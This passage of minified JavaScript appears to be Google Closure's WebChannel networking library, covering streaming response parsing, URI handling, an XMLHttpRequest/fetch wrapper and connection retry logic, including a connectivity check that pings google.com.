yt(this.i,this.l,Yr,null),Ao(this,Yr);if(Aa(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),zn!=4||fe.length!=0||this.h.h||(this.s=1,Ge(16),A=!1),this.o=this.o&&A,!A)yt(this.i,this.l,fe,"[Invalid Chunked Response]"),Qr(this),Bi(this);else if(0<fe.length&&!this.W){this.W=!0;var Fn=this.j;Fn.g==this&&Fn.ba&&!Fn.M&&(Fn.j.info("Great, no buffering proxy detected. Bytes received: "+fe.length),lg(Fn),Fn.M=!0,Ge(11))}}else yt(this.i,this.l,fe,null),Ao(this,fe);zn==4&&Qr(this),this.o&&!this.J&&(zn==4?A_(this.j,this):(this.o=!1,ys(this)))}else jC(this.g),A==400&&0<fe.indexOf("Unknown SID")?(this.s=3,Ge(12)):(this.s=0,Ge(13)),Qr(this),Bi(this)}}}catch{}finally{}};function Aa(c){return c.g?c.u=="GET"&&c.L!=2&&c.j.Ca:!1}function dc(c,p){var A=c.C,O=p.indexOf(`
`,A);return O==-1?Io:(A=Number(p.substring(A,O)),isNaN(A)?Sa:(O+=1,O+A>p.length?Io:(p=p.slice(O,O+A),c.C=O+A,p)))}Or.prototype.cancel=function(){this.J=!0,Qr(this)};function ys(c){c.S=Date.now()+c.I,ba(c,c.I)}function ba(c,p){if(c.B!=null)throw Error("WatchDog timer not null");c.B=Et(m(c.ba,c),p)}function To(c){c.B&&(a.clearTimeout(c.B),c.B=null)}Or.prototype.ba=function(){this.B=null;const c=Date.now();0<=c-this.S?(_h(this.i,this.A),this.L!=2&&(ms(),Ge(17)),Qr(this),this.s=2,Bi(this)):ba(this,this.S-c)};function Bi(c){c.j.G==0||c.J||A_(c.j,c)}function Qr(c){To(c);var p=c.M;p&&typeof p.ma=="function"&&p.ma(),c.M=null,Pe(c.U),c.g&&(p=c.g,c.g=null,p.abort(),p.ma())}function Ao(c,p){try{var A=c.j;if(A.G!=0&&(A.g==c||bo(A.h,c))){if(!c.K&&bo(A.h,c)&&A.G==3){try{var O=A.Da.g.parse(p)}catch{O=null}if(Array.isArray(O)&&O.length==3){var Q=O;if(Q[0]==0){e:if(!A.u){if(A.g)if(A.g.F+3e3<c.F)Ch(A),xh(A);else break e;ag(A),Ge(18)}}else A.za=Q[1],0<A.za-A.T&&37500>Q[2]&&A.F&&A.v==0&&!A.C&&(A.C=Et(m(A.Za,A),6e3));if(1>=Ca(A.h)&&A.ca){try{A.ca()}catch{}A.ca=void 0}}else ko(A,11)}else if((c.K||A.g==c)&&Ch(A),!b(p))for(Q=A.Da.g.parse(p),p=0;p<Q.length;p++){let et=Q[p];if(A.T=et[0],et=et[1],A.G==2)if(et[0]=="c"){A.K=et[1],A.ia=et[2];const Fn=et[3];Fn!=null&&(A.la=Fn,A.j.info("VER="+A.la));const zn=et[4];zn!=null&&(A.Aa=zn,A.j.info("SVER="+A.Aa));const Na=et[5];Na!=null&&typeof Na=="number"&&0<Na&&(O=1.5*Na,A.L=O,A.j.info("backChannelRequestTimeoutMs_="+O)),O=A;const Yr=c.g;if(Yr){const Mh=Yr.g?Yr.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(Mh){var ne=O.h;ne.g||Mh.indexOf("spdy")==-1&&Mh.indexOf("quic")==-1&&Mh.indexOf("h2")==-1||(ne.j=ne.l,ne.g=new Set,ne.h&&(ig(ne,ne.h),ne.h=null))}if(O.D){const cg=Yr.g?Yr.g.getResponseHeader("X-HTTP-Session-Id"):null;cg&&(O.ya=cg,kt(O.I,O.D,cg))}}A.G=3,A.l&&A.l.ua(),A.ba&&(A.R=Date.now()-c.F,A.j.info("Handshake RTT: "+A.R+"ms")),O=A;var fe=c;if(O.qa=k_(O,O.J?O.ia:null,O.W),fe.K){r_(O.h,fe);var wt=fe,kn=O.L;kn&&(wt.I=kn),wt.B&&(To(wt),ys(wt)),O.g=fe}else S_(O);0<A.i.length&&kh(A)}else et[0]!="stop"&&et[0]!="close"||ko(A,7);else A.G==3&&(et[0]=="stop"||et[0]=="close"?et[0]=="stop"?ko(A,7):og(A):et[0]!="noop"&&A.l&&A.l.ta(et),A.v=0)}}ms(4)}catch{}}var pc=class{constructor(c,p){this.g=c,this.map=p}};function xa(c){this.l=c||10,a.PerformanceNavigationTiming?(c=a.performance.getEntriesByType("navigation"),c=0<c.length&&(c[0].nextHopProtocol=="hq"||c[0].nextHopProtocol=="h2")):c=!!(a.chrome&&a.chrome.loadTimes&&a.chrome.loadTimes()&&a.chrome.loadTimes().wasFetchedViaSpdy),this.j=c?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function ka(c){return c.h?!0:c.g?c.g.size>=c.j:!1}function Ca(c){return c.h?1:c.g?c.g.size:0}function bo(c,p){return c.h?c.h==p:c.g?c.g.has(p):!1}function ig(c,p){c.g?c.g.add(p):c.h=p}function r_(c,p){c.h&&c.h==p?c.h=null:c.g&&c.g.has(p)&&c.g.delete(p)}xa.prototype.cancel=function(){if(this.i=i_(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const c of this.g.values())c.cancel();this.g.clear()}};function i_(c){if(c.h!=null)return c.i.concat(c.h.D);if(c.g!=null&&c.g.size!==0){let p=c.i;for(const A of c.g.values())p=p.concat(A.D);return p}return k(c.i)}function TC(c){if(c.V&&typeof c.V=="function")return c.V();if(typeof Map<"u"&&c instanceof Map||typeof Set<"u"&&c instanceof Set)return Array.from(c.values());if(typeof c=="string")return c.split("");if(l(c)){for(var p=[],A=c.length,O=0;O<A;O++)p.push(c[O]);return p}p=[],A=0;for(O in c)p[A++]=c[O];return p}function AC(c){if(c.na&&typeof c.na=="function")return c.na();if(!c.V||typeof c.V!="function"){if(typeof Map<"u"&&c instanceof Map)return Array.from(c.keys());if(!(typeof Set<"u"&&c instanceof Set)){if(l(c)||typeof c=="string"){var p=[];c=c.length;for(var A=0;A<c;A++)p.push(A);return p}p=[],A=0;for(const O in c)p[A++]=O;return p}}}function s_(c,p){if(c.forEach&&typeof c.forEach=="function")c.forEach(p,void 0);else if(l(c)||typeof c=="string")Array.prototype.forEach.call(c,p,void 0);else for(var A=AC(c),O=TC(c),Q=O.length,ne=0;ne<Q;ne++)p.call(void 0,O[ne],A&&A[ne],c)}var o_=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function bC(c,p){if(c){c=c.split("&");for(var A=0;A<c.length;A++){var O=c[A].indexOf("="),Q=null;if(0<=O){var ne=c[A].substring(0,O);Q=c[A].substring(O+1)}else ne=c[A];p(ne,Q?decodeURIComponent(Q.replace(/\+/g," ")):"")}}}function xo(c){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,c instanceof xo){this.h=c.h,Eh(this,c.j),this.o=c.o,this.g=c.g,Ih(this,c.s),this.l=c.l;var p=c.i,A=new yc;A.i=p.i,p.g&&(A.g=new Map(p.g),A.h=p.h),a_(this,A),this.m=c.m}else c&&(p=String(c).match(o_))?(this.h=!1,Eh(this,p[1]||"",!0),this.o=gc(p[2]||""),this.g=gc(p[3]||"",!0),Ih(this,p[4]),this.l=gc(p[5]||"",!0),a_(this,p[6]||"",!0),this.m=gc(p[7]||"")):(this.h=!1,this.i=new yc(null,this.h))}xo.prototype.toString=function(){var c=[],p=this.j;p&&c.push(mc(p,l_,!0),":");var A=this.g;return(A||p=="file")&&(c.push("//"),(p=this.o)&&c.push(mc(p,l_,!0),"@"),c.push(encodeURIComponent(String(A)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),A=this.s,A!=null&&c.push(":",String(A))),(A=this.l)&&(this.g&&A.charAt(0)!="/"&&c.push("/"),c.push(mc(A,A.charAt(0)=="/"?CC:kC,!0))),(A=this.i.toString())&&c.push("?",A),(A=this.m)&&c.push("#",mc(A,MC)),c.join("")};function Ui(c){return new xo(c)}function Eh(c,p,A){c.j=A?gc(p,!0):p,c.j&&(c.j=c.j.replace(/:$/,""))}function Ih(c,p){if(p){if(p=Number(p),isNaN(p)||0>p)throw Error("Bad port number "+p);c.s=p}else c.s=null}function a_(c,p,A){p instanceof yc?(c.i=p,NC(c.i,c.h)):(A||(p=mc(p,RC)),c.i=new yc(p,c.h))}function kt(c,p,A){c.i.set(p,A)}function Sh(c){return kt(c,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),c}function gc(c,p){return c?p?decodeURI(c.replace(/%25/g,"%2525")):decodeURIComponent(c):""}function mc(c,p,A){return typeof c=="string"?(c=encodeURI(c).replace(p,xC),A&&(c=c.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),c):null}function xC(c){return c=c.charCodeAt(0),"%"+(c>>4&15).toString(16)+(c&15).toString(16)}var l_=/[#\/\?@]/g,kC=/[#\?:]/g,CC=/[#\?]/g,RC=/[#\?@]/g,MC=/#/g;function yc(c,p){this.h=this.g=null,this.i=c||null,this.j=!!p}function ws(c){c.g||(c.g=new Map,c.h=0,c.i&&bC(c.i,function(p,A){c.add(decodeURIComponent(p.replace(/\+/g," ")),A)}))}n=yc.prototype,n.add=function(c,p){ws(this),this.i=null,c=Ra(this,c);var A=this.g.get(c);return A||this.g.set(c,A=[]),A.push(p),this.h+=1,this};function c_(c,p){ws(c),p=Ra(c,p),c.g.has(p)&&(c.i=null,c.h-=c.g.get(p).length,c.g.delete(p))}function u_(c,p){return ws(c),p=Ra(c,p),c.g.has(p)}n.forEach=function(c,p){ws(this),this.g.forEach(function(A,O){A.forEach(function(Q){c.call(p,Q,O,this)},this)},this)},n.na=function(){ws(this);const c=Array.from(this.g.values()),p=Array.from(this.g.keys()),A=[];for(let O=0;O<p.length;O++){const Q=c[O];for(let ne=0;ne<Q.length;ne++)A.push(p[O])}return A},n.V=function(c){ws(this);let p=[];if(typeof c=="string")u_(this,c)&&(p=p.concat(this.g.get(Ra(this,c))));else{c=Array.from(this.g.values());for(let A=0;A<c.length;A++)p=p.concat(c[A])}return p},n.set=function(c,p){return ws(this),this.i=null,c=Ra(this,c),u_(this,c)&&(this.h-=this.g.get(c).length),this.g.set(c,[p]),this.h+=1,this},n.get=function(c,p){return c?(c=this.V(c),0<c.length?String(c[0]):p):p};function h_(c,p,A){c_(c,p),0<A.length&&(c.i=null,c.g.set(Ra(c,p),k(A)),c.h+=A.length)}n.toString=function(){if(this.i)return this.i;if(!this.g)return"";const c=[],p=Array.from(this.g.keys());for(var A=0;A<p.length;A++){var O=p[A];const ne=encodeURIComponent(String(O)),fe=this.V(O);for(O=0;O<fe.length;O++){var Q=ne;fe[O]!==""&&(Q+="="+encodeURIComponent(String(fe[O]))),c.push(Q)}}return this.i=c.join("&")};function Ra(c,p){return p=String(p),c.j&&(p=p.toLowerCase()),p}function NC(c,p){p&&!c.j&&(ws(c),c.i=null,c.g.forEach(function(A,O){var Q=O.toLowerCase();O!=Q&&(c_(this,O),h_(this,Q,A))},c)),c.j=p}function PC(c,p){const A=new It;if(a.Image){const O=new Image;O.onload=v(vs,A,"TestLoadImage: loaded",!0,p,O),O.onerror=v(vs,A,"TestLoadImage: error",!1,p,O),O.onabort=v(vs,A,"TestLoadImage: abort",!1,p,O),O.ontimeout=v(vs,A,"TestLoadImage: timeout",!1,p,O),a.setTimeout(function(){O.ontimeout&&O.ontimeout()},1e4),O.src=c}else p(!1)}function LC(c,p){const A=new It,O=new AbortController,Q=setTimeout(()=>{O.abort(),vs(A,"TestPingServer: timeout",!1,p)},1e4);fetch(c,{signal:O.signal}).then(ne=>{clearTimeout(Q),ne.ok?vs(A,"TestPingServer: ok",!0,p):vs(A,"TestPingServer: server error",!1,p)}).catch(()=>{clearTimeout(Q),vs(A,"TestPingServer: error",!1,p)})}function vs(c,p,A,O,Q){try{Q&&(Q.onload=null,Q.onerror=null,Q.onabort=null,Q.ontimeout=null),O(A)}catch{}}function DC(){this.g=new xe}function OC(c,p,A){const O=A||"";try{s_(c,function(Q,ne){let fe=Q;u(Q)&&(fe=Ce(Q)),p.push(O+ne+"="+encodeURIComponent(fe))})}catch(Q){throw p.push(O+"type="+encodeURIComponent("_badmap")),Q}}function Th(c){this.l=c.Ub||null,this.j=c.eb||!1}x(Th,Lt),Th.prototype.g=function(){return new Ah(this.l,this.j)},Th.prototype.i=function(c){return function(){return c}}({});function Ah(c,p){P.call(this),this.D=c,this.o=p,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}x(Ah,P),n=Ah.prototype,n.open=function(c,p){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=c,this.A=p,this.readyState=1,vc(this)},n.send=function(c){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;const p={headers:this.u,method:this.B,credentials:this.m,cache:void 0};c&&(p.body=c),(this.D||a).fetch(new Request(this.A,p)).then(this.Sa.bind(this),this.ga.bind(this))},n.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,wc(this)),this.readyState=0},n.Sa=function(c){if(this.g&&(this.l=c,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=c.headers,this.readyState=2,vc(this)),this.g&&(this.readyState=3,vc(this),this.g)))if(this.responseType==="arraybuffer")c.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof a.ReadableStream<"u"&&"body"in c){if(this.j=c.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;f_(this)}else c.text().then(this.Ra.bind(this),this.ga.bind(this))};function f_(c){c.j.read().then(c.Pa.bind(c)).catch(c.ga.bind(c))}n.Pa=function(c){if(this.g){if(this.o&&c.value)this.response.push(c.value);else if(!this.o){var p=c.value?c.value:new Uint8Array(0);(p=this.v.decode(p,{stream:!c.done}))&&(this.response=this.responseText+=p)}c.done?wc(this):vc(this),this.readyState==3&&f_(this)}},n.Ra=function(c){this.g&&(this.response=this.responseText=c,wc(this))},n.Qa=function(c){this.g&&(this.response=c,wc(this))},n.ga=function(){this.g&&wc(this)};function wc(c){c.readyState=4,c.l=null,c.j=null,c.v=null,vc(c)}n.setRequestHeader=function(c,p){this.u.append(c,p)},n.getResponseHeader=function(c){return this.h&&this.h.get(c.toLowerCase())||""},n.getAllResponseHeaders=function(){if(!this.h)return"";const c=[],p=this.h.entries();for(var A=p.next();!A.done;)A=A.value,c.push(A[0]+": "+A[1]),A=p.next();return c.join(`\r
`)};function vc(c){c.onreadystatechange&&c.onreadystatechange.call(c)}Object.defineProperty(Ah.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(c){this.m=c?"include":"same-origin"}});function d_(c){let p="";return q(c,function(A,O){p+=O,p+=":",p+=A,p+=`\r
`}),p}function sg(c,p,A){e:{for(O in A){var O=!1;break e}O=!0}O||(A=d_(A),typeof c=="string"?A!=null&&encodeURIComponent(String(A)):kt(c,p,A))}function Jt(c){P.call(this),this.headers=new Map,this.o=c||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}x(Jt,P);var BC=/^https?$/i,UC=["POST","PUT"];n=Jt.prototype,n.Ha=function(c){this.J=c},n.ea=function(c,p,A,O){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+c);p=p?p.toUpperCase():"GET",this.D=c,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():Ot.g(),this.v=this.o?cc(this.o):cc(Ot),this.g.onreadystatechange=m(this.Ea,this);try{this.B=!0,this.g.open(p,String(c),!0),this.B=!1}catch(ne){p_(this,ne);return}if(c=A||"",A=new Map(this.headers),O)if(Object.getPrototypeOf(O)===Object.prototype)for(var Q in O)A.set(Q,O[Q]);else if(typeof O.keys=="function"&&typeof O.get=="function")for(const ne of O.keys())A.set(ne,O.get(ne));else throw Error("Unknown input type for opt_headers: "+String(O));O=Array.from(A.keys()).find(ne=>ne.toLowerCase()=="content-type"),Q=a.FormData&&c instanceof a.FormData,!(0<=Array.prototype.indexOf.call(UC,p,void 0))||O||Q||A.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[ne,fe]of A)this.g.setRequestHeader(ne,fe);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{y_(this),this.u=!0,this.g.send(c),this.u=!1}catch(ne){p_(this,ne)}};function p_(c,p){c.h=!1,c.g&&(c.j=!0,c.g.abort(),c.j=!1),c.l=p,c.m=5,g_(c),bh(c)}function g_(c){c.A||(c.A=!0,g(c,"complete"),g(c,"error"))}n.abort=function(c){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=c||7,g(this,"complete"),g(this,"abort"),bh(this))},n.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),bh(this,!0)),Jt.aa.N.call(this)},n.Ea=function(){this.s||(this.B||this.u||this.j?m_(this):this.bb())},n.bb=function(){m_(this)};function m_(c){if(c.h&&typeof o<"u"&&(!c.v[1]||ji(c)!=4||c.Z()!=2)){if(c.u&&ji(c)==4)F(c.Ea,0,c);else if(g(c,"readystatechange"),ji(c)==4){c.h=!1;try{const fe=c.Z();e:switch(fe){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var p=!0;break e;default:p=!1}var A;if(!(A=p)){var O;if(O=fe===0){var Q=String(c.D).match(o_)[1]||null;!Q&&a.self&&a.self.location&&(Q=a.self.location.protocol.slice(0,-1)),O=!BC.test(Q?Q.toLowerCase():"")}A=O}if(A)g(c,"complete"),g(c,"success");else{c.m=6;try{var ne=2<ji(c)?c.g.statusText:""}catch{ne=""}c.l=ne+" ["+c.Z()+"]",g_(c)}}finally{bh(c)}}}}function bh(c,p){if(c.g){y_(c);const A=c.g,O=c.v[0]?()=>{}:null;c.g=null,c.v=null,p||g(c,"ready");try{A.onreadystatechange=O}catch{}}}function y_(c){c.I&&(a.clearTimeout(c.I),c.I=null)}n.isActive=function(){return!!this.g};function ji(c){return c.g?c.g.readyState:0}n.Z=function(){try{return 2<ji(this)?this.g.status:-1}catch{return-1}},n.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},n.Oa=function(c){if(this.g){var p=this.g.responseText;return c&&p.indexOf(c)==0&&(p=p.substring(c.length)),mt(p)}};function w_(c){try{if(!c.g)return null;if("response"in c.g)return c.g.response;switch(c.H){case"":case"text":return c.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in c.g)return c.g.mozResponseArrayBuffer}return null}catch{return null}}function jC(c){const p={};c=(c.g&&2<=ji(c)&&c.g.getAllResponseHeaders()||"").split(`\r
`);for(let O=0;O<c.length;O++){if(b(c[O]))continue;var A=W(c[O]);const Q=A[0];if(A=A[1],typeof A!="string")continue;A=A.trim();const ne=p[Q]||[];p[Q]=ne,ne.push(A)}L(p,function(O){return O.join(", ")})}n.Ba=function(){return this.m},n.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function _c(c,p,A){return A&&A.internalChannelParams&&A.internalChannelParams[c]||p}function v_(c){this.Aa=0,this.i=[],this.j=new It,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=_c("failFast",!1,c),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=_c("baseRetryDelayMs",5e3,c),this.cb=_c("retryDelaySeedMs",1e4,c),this.Wa=_c("forwardChannelMaxRetries",2,c),this.wa=_c("forwardChannelRequestTimeoutMs",2e4,c),this.pa=c&&c.xmlHttpFactory||void 0,this.Xa=c&&c.Tb||void 0,this.Ca=c&&c.useFetchStreams||!1,this.L=void 0,this.J=c&&c.supportsCrossDomainXhr||!1,this.K="",this.h=new xa(c&&c.concurrentRequestLimit),this.Da=new DC,this.P=c&&c.fastHandshake||!1,this.O=c&&c.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=c&&c.Rb||!1,c&&c.xa&&this.j.xa(),c&&c.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&c&&c.detectBufferingProxy||!1,this.ja=void 0,c&&c.longPollingTimeout&&0<c.longPollingTimeout&&(this.ja=c.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}n=v_.prototype,n.la=8,n.G=1,n.connect=function(c,p,A,O){Ge(0),this.W=c,this.H=p||{},A&&O!==void 0&&(this.H.OSID=A,this.H.OAID=O),this.F=this.X,this.I=k_(this,null,this.W),kh(this)};function og(c){if(__(c),c.G==3){var p=c.U++,A=Ui(c.I);if(kt(A,"SID",c.K),kt(A,"RID",p),kt(A,"TYPE","terminate"),Ec(c,A),p=new Or(c,c.j,p),p.L=2,p.v=Sh(Ui(A)),A=!1,a.navigator&&a.navigator.sendBeacon)try{A=a.navigator.sendBeacon(p.v.toString(),"")}catch{}!A&&a.Image&&(new Image().src=p.v,A=!0),A||(p.g=C_(p.j,null),p.g.ea(p.v)),p.F=Date.now(),ys(p)}x_(c)}function xh(c){c.g&&(lg(c),c.g.cancel(),c.g=null)}function __(c){xh(c),c.u&&(a.clearTimeout(c.u),c.u=null),Ch(c),c.h.cancel(),c.s&&(typeof c.s=="number"&&a.clearTimeout(c.s),c.s=null)}function kh(c){if(!ka(c.h)&&!c.s){c.s=!0;var p=c.Ga;M||$(),R||(M(),R=!0),j.add(p,c),c.B=0}}function VC(c,p){return Ca(c.h)>=c.h.j-(c.s?1:0)?!1:c.s?(c.i=p.D.concat(c.i),!0):c.G==1||c.G==2||c.B>=(c.Va?0:c.Wa)?!1:(c.s=Et(m(c.Ga,c,p),b_(c,c.B)),c.B++,!0)}n.Ga=function(c){if(this.s)if(this.s=null,this.G==1){if(!c){this.U=Math.floor(1e5*Math.random()),c=this.U++;const Q=new Or(this,this.j,c);let ne=this.o;if(this.S&&(ne?(ne=N(ne),z(ne,this.S)):ne=this.S),this.m!==null||this.O||(Q.H=ne,ne=null),this.P)e:{for(var p=0,A=0;A<this.i.length;A++){t:{var O=this.i[A];if("__data__"in O.map&&(O=O.map.__data__,typeof O=="string")){O=O.length;break t}O=void 0}if(O===void 0)break;if(p+=O,4096<p){p=A;break e}if(p===4096||A===this.i.length-1){p=A+1;break e}}p=1e3}else p=1e3;p=I_(this,Q,p),A=Ui(this.I),kt(A,"RID",c),kt(A,"CVER",22),this.D&&kt(A,"X-HTTP-Session-Id",this.D),Ec(this,A),ne&&(this.O?p="headers="+encodeURIComponent(String(d_(ne)))+"&"+p:this.m&&sg(A,this.m,ne)),ig(this.h,Q),this.Ua&&kt(A,"TYPE","init"),this.P?(kt(A,"$req",p),kt(A,"SID","null"),Q.T=!0,So(Q,A,null)):So(Q,A,p),this.G=2}}else this.G==3&&(c?E_(this,c):this.i.length==0||ka(this.h)||E_(this))};function E_(c,p){var A;p?A=p.l:A=c.U++;const O=Ui(c.I);kt(O,"SID",c.K),kt(O,"RID",A),kt(O,"AID",c.T),Ec(c,O),c.m&&c.o&&sg(O,c.m,c.o),A=new Or(c,c.j,A,c.B+1),c.m===null&&(A.H=c.o),p&&(c.i=p.D.concat(c.i)),p=I_(c,A,1e3),A.I=Math.round(.5*c.wa)+Math.round(.5*c.wa*Math.random()),ig(c.h,A),So(A,O,p)}function Ec(c,p){c.H&&q(c.H,function(A,O){kt(p,O,A)}),c.l&&s_({},function(A,O){kt(p,O,A)})}function I_(c,p,A){A=Math.min(c.i.length,A);var O=c.l?m(c.l.Na,c.l,c):null;e:{var Q=c.i;let ne=-1;for(;;){const fe=["count="+A];ne==-1?0<A?(ne=Q[0].g,fe.push("ofs="+ne)):ne=0:fe.push("ofs="+ne);let wt=!0;for(let kn=0;kn<A;kn++){let et=Q[kn].g;const Fn=Q[kn].map;if(et-=ne,0>et)ne=Math.max(0,Q[kn].g-100),wt=!1;else try{OC(Fn,fe,"req"+et+"_")}catch{O&&O(Fn)}}if(wt){O=fe.join("&");break e}}}return c=c.i.splice(0,A),p.D=c,O}function S_(c){if(!c.g&&!c.u){c.Y=1;var p=c.Fa;M||$(),R||(M(),R=!0),j.add(p,c),c.v=0}}function ag(c){return c.g||c.u||3<=c.v?!1:(c.Y++,c.u=Et(m(c.Fa,c),b_(c,c.v)),c.v++,!0)}n.Fa=function(){if(this.u=null,T_(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var c=2*this.R;this.j.info("BP detection timer enabled: "+c),this.A=Et(m(this.ab,this),c)}},n.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,Ge(10),xh(this),T_(this))};function lg(c){c.A!=null&&(a.clearTimeout(c.A),c.A=null)}function T_(c){c.g=new Or(c,c.j,"rpc",c.Y),c.m===null&&(c.g.H=c.o),c.g.O=0;var p=Ui(c.qa);kt(p,"RID","rpc"),kt(p,"SID",c.K),kt(p,"AID",c.T),kt(p,"CI",c.F?"0":"1"),!c.F&&c.ja&&kt(p,"TO",c.ja),kt(p,"TYPE","xmlhttp"),Ec(c,p),c.m&&c.o&&sg(p,c.m,c.o),c.L&&(c.g.I=c.L);var A=c.g;c=c.ia,A.L=1,A.v=Sh(Ui(p)),A.m=null,A.P=!0,Ta(A,c)}n.Za=function(){this.C!=null&&(this.C=null,xh(this),ag(this),Ge(19))};function Ch(c){c.C!=null&&(a.clearTimeout(c.C),c.C=null)}function A_(c,p){var A=null;if(c.g==p){Ch(c),lg(c),c.g=null;var O=2}else if(bo(c.h,p))A=p.D,r_(c.h,p),O=1;else return;if(c.G!=0){if(p.o)if(O==1){A=p.m?p.m.length:0,p=Date.now()-p.F;var Q=c.B;O=At(),g(O,new hc(O,A)),kh(c)}else S_(c);else if(Q=p.s,Q==3||Q==0&&0<p.X||!(O==1&&VC(c,p)||O==2&&ag(c)))switch(A&&0<A.length&&(p=c.h,p.i=p.i.concat(A)),Q){case 1:ko(c,5);break;case 4:ko(c,10);break;case 3:ko(c,6);break;default:ko(c,2)}}}function b_(c,p){let A=c.Ta+Math.floor(Math.random()*c.cb);return c.isActive()||(A*=2),A*p}function ko(c,p){if(c.j.info("Error code "+p),p==2){var A=m(c.fb,c),O=c.Xa;const Q=!O;O=new xo(O||"//www.google.com/images/cleardot.gif"),a.location&&a.location.protocol=="http"||Eh(O,"https"),Sh(O),Q?PC(O.toString(),A):LC(O.toString(),A)}else Ge(2);c.G=0,c.l&&c.l.sa(p),x_(c),__(c)}n.fb=function(c){c?(this.j.info("Successfully pinged google.com"),Ge(2)):(this.j.info("Failed to ping google.com"),Ge(1))};function x_(c){if(c.G=0,c.ka=[],c.l){const p=i_(c.h);(p.length!=0||c.i.length!=0)&&(I(c.ka,p),I(c.ka,c.i),c.h.i.length=0,k(c.i),c.i.length=0),c.l.ra()}}function k_(c,p,A){var O=A instanceof xo?Ui(A):new xo(A);if(O.g!="")p&&(O.g=p+"."+O.g),Ih(O,O.s);else{var Q=a.location;O=Q.protocol,p=p?p+"."+Q.hostname:Q.hostname,Q=+Q.port;var ne=new xo(null);O&&Eh(ne,O),p&&(ne.g=p),Q&&Ih(ne,Q),A&&(ne.l=A),O=ne}return A=c.D,p=c.ya,A&&p&&kt(O,A,p),kt(O,"VER",c.la),Ec(c,O),O}function C_(c,p,A){if(p&&!c.J)throw Error("Can't create secondary domain capable XhrIo object.");return p=c.Ca&&!c.pa?new Jt(new Th({eb:A})):new Jt(c.pa),p.Ha(c.J),p}n.isActive=function(){return!!this.l&&this.l.isActive(this)};function R_(){}n=R_.prototype,n.ua=function(){},n.ta=function(){},n.sa=function(){},n.ra=function(){},n.isActive=function(){return!0},n.Na=function(){};function Rh(){}Rh.prototype.g=function(c,p){return new _r(c,p)};function _r(c,p){P.call(this),this.g=new v_(p),this.l=c,this.h=p&&p.messageUrlParams||null,c=p&&p.messageHeaders||null,p&&p.clientProtocolHeaderRequired&&(c?c["X-Client-Protocol"]="webchannel":c={"X-Client-Protocol":"webchannel"}),this.g.o=c,c=p&&p.initMessageHeaders||null,p&&p.messageContentType&&(c?c["X-WebChannel-Content-Type"]=p.messageContentType:c={"X-WebChannel-Content-Type":p.messageContentType}),p&&p.va&&(c?c["X-WebChannel-Client-Profile"]=p.va:c={"X-WebChannel-Client-Profile":p.va}),this.g.S=c,(c=p&&p.Sb)&&!b(c)&&(this.g.m=c),this.v=p&&p.supportsCrossDomainXhr||!1,this.u=p&&p.sendRawJson||!1,(p=p&&p.httpSessionIdParam)&&!b(p)&&(this.g.D=p,c=this.h,c!==null&&p in c&&(c=this.h,p in c&&delete c[p])),this.j=new Ma(this)}x(_r,P),_r.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},_r.prototype.close=function(){og(this.g)},_r.prototype.o=function(c){var p=this.g;if(typeof c=="string"){var A={};A.__data__=c,c=A}else this.u&&(A={},A.__data__=Ce(c),c=A);p.i.push(new pc(p.Ya++,c)),p.G==3&&kh(p)},_r.prototype.N=function(){this.g.l=null,delete this.j,og(this.g),delete this.g,_r.aa.N.call(this)};function M_(c){Ea.call(this),c.__headers__&&(this.headers=c.__headers__,this.statusCode=c.__status__,delete c.__headers__,delete c.__status__);var 